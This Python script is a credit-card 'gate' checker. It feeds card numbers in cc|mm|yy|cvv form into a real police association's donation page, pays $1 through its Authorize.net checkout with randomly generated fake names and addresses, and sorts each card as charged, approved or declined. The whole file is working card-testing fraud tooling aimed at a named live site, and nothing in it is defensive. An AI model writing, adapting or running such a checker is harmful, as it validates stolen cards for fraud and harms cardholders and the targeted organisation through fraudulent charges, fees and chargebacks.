import asyncio
import re
import random
import string
import logging
import json
import aiohttp
from bs4 import BeautifulSoup


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOM DATA GENERATORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def random_string(length=5):
    return ''.join(random.choices(string.ascii_letters, k=length)).capitalize()

def random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{random_string(7).lower()}@{random.choice(domains)}"

def random_phone():
    return ''.join(random.choices(string.digits, k=10))

def random_address():
    streets = ["Main St", "Oak Ave", "Pine Ln", "Maple Dr", "Cedar Rd"]
    return f"{random.randint(100, 9999)} {random.choice(streets)}"

def random_city():
    cities = ["Springfield", "Shelbyville", "Ogdenville", "North Haverbrook"]
    return random.choice(cities)

def random_state():
    states = ["AL", "CA", "TX", "FL", "NY", "OH", "IL", "PA"]
    return random.choice(states)

def random_zip():
    return str(random.randint(10000, 99999))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN GATE FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_gate(card: str) -> dict:
    """
    Checks a card through Authorize.net gateway (1$ charge).
    
    Args:
        card: Card in format cc|mm|yy|cvv
    
    Returns:
        dict with keys:
            - status: "charged", "approved", "declined", "error"
            - response: Human readable response message
    """
    try:
        card = card.strip()
        parts = card.split('|')
        if len(parts) != 4:
            return {"status": "error", "response": "Invalid card format"}
       
        card_number, exp_month, exp_year, cvv = parts
        exp_year = exp_year[-2:]
        
        # Hardcoded $1.00 amount
        amount = "1.00"
       
        donate_url = "https://www.southamptontownpolicesoa.com/donate/"
        ajax_url = "https://www.southamptontownpolicesoa.com/wp-admin/admin-ajax.php"
       
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 1: Get donate page and extract tokens
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            async with session.get(donate_url, headers=base_headers) as resp:
                html = await resp.text()
            
            soup = BeautifulSoup(html, 'html.parser')
            
            # Extract soa_checkout_nonce from form
            nonce_input = soup.find('input', {'name': 'soa_checkout_nonce'})
            if not nonce_input:
                return {"status": "error", "response": "Failed to extract checkout nonce"}
            soa_nonce = nonce_input.get('value')
            
            # Extract ajax_nonce from scripts
            ajax_nonce = ""
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    match = re.search(r'nonce["\']?\s*:\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        ajax_nonce = match.group(1)
                        break
                    match = re.search(r'ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        ajax_nonce = match.group(1)
                        break
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 2: Build form data
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            form_data = {
                'soa_checkout_nonce': soa_nonce,
                '_wp_http_referer': '/donate/',
                'donation_amount': amount,
                'first_name': random_string(),
                'last_name': random_string(),
                'email': random_email(),
                'phone': random_phone(),
                'address': random_address(),
                'city': random_city(),
                'state': random_state(),
                'zip': random_zip(),
                'payment_method': 'credit_card',
                'card_number': card_number,
                'exp_month': exp_month,
                'exp_year': exp_year,
                'cvv': cvv,
                'account_holder_name': '',
                'routing_number': '',
                'account_number': '',
                'account_type': '',
                'bank_name': '',
                'action': 'soa_process_checkout',
                'nonce': ajax_nonce,
            }
            
            # Add empty product quantities
            for i in range(1, 9):
                form_data[f'products[{i}][quantity]'] = '0'
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 3: Submit payment request
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            ajax_headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': donate_url,
                'Origin': 'https://www.southamptontownpolicesoa.com',
                'User-Agent': base_headers['User-Agent'],
            }
            
            async with session.post(ajax_url, data=form_data, headers=ajax_headers) as resp:
                response_text = await resp.text()
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 4: Parse and determine status
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            
            # Check for COMPLETED/Success first (CHARGED)
            if 'COMPLETED' in response_text.upper() or '"success":true' in response_text.lower():
                return {"status": "charged", "response": "Transaction authorized successfully [001]"}
            
            # Try to parse JSON
            try:
                response_json = json.loads(response_text)
                
                # Explicit success check
                if response_json.get('success') == True:
                    return {"status": "charged", "response": "Transaction authorized successfully [001]"}
                
                # Check for error in data
                data = response_json.get('data', {})
                
                if isinstance(data, dict):
                    message = data.get('message', '')
                elif isinstance(data, str):
                    message = data
                else:
                    message = str(data)
                
                # Extract error code from message format: "message (Code: XXXXX)"
                code_match = re.search(r'\(Code:\s*([^\)]+)\)', message)
                if code_match:
                    error_code = code_match.group(1).strip()
                    # Clean message (remove the code part for cleaner display)
                    clean_message = re.sub(r'\s*\(Code:[^\)]+\)', '', message).strip()
                    # Remove "The transaction was unsuccessful." prefix if present
                    clean_message = re.sub(r'^The transaction was unsuccessful\.\s*', '', clean_message).strip()
                    if clean_message:
                        return {"status": "declined", "response": f"{clean_message} [{error_code}]"}
                    return {"status": "declined", "response": f"Transaction failed [{error_code}]"}
                
                # If no code found but success is false
                if message:
                    return {"status": "declined", "response": message}
                
                return {"status": "declined", "response": "Transaction failed [UNKNOWN]"}
                
            except json.JSONDecodeError:
                # Non-JSON response - check for error patterns
                if 'E00027' in response_text:
                    code_match = re.search(r'Code:\s*([^\)\s]+)', response_text)
                    error_code = code_match.group(1) if code_match else "E00027"
                    return {"status": "declined", "response": f"Transaction failed [{error_code}]"}
                
                if 'unsuccessful' in response_text.lower():
                    code_match = re.search(r'Code:\s*([^\)\s]+)', response_text)
                    error_code = code_match.group(1) if code_match else "ERROR"
                    return {"status": "declined", "response": f"Transaction unsuccessful [{error_code}]"}
                
                # Truncate long responses
                display_text = response_text[:100] + "..." if len(response_text) > 100 else response_text
                return {"status": "error", "response": display_text if display_text else "Unknown error"}
               
    except asyncio.TimeoutError:
        logging.error("AuthNet Gate Error: Request timed out")
        return {"status": "error", "response": "Connection Timed Out"}
    except aiohttp.ClientError as e:
        logging.error(f"AuthNet Gate Error: {e}")
        return {"status": "error", "response": "Connection Error"}
    except Exception as e:
        logging.error(f"AuthNet Gate Error: {e}")
        return {"status": "error", "response": str(e)}
